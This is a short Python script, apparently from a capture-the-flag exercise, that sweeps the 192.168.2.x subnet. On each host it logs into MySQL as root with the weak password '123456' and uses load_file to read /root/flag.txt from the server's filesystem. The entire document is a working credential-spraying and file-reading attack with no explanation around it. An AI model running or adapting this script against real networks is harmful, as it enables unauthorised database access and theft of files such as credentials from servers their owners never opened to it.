import MySQLdb
for i in range(254):
	try:
		ip='192.168.2.'+str(i)
		conn=MySQLdb.connect(host=ip,user='root',passwd='123456',connect_timeout=1)
		cursor=conn.cursor()
		sql="select load_file('/root/flag.txt')"
		try:
			cursor.execute(sql)
			result=cursor.fetchall()
			print(i,result)
			conn.close()
		except:
			print (i,'exec down')
	except:
		print (i,'con down')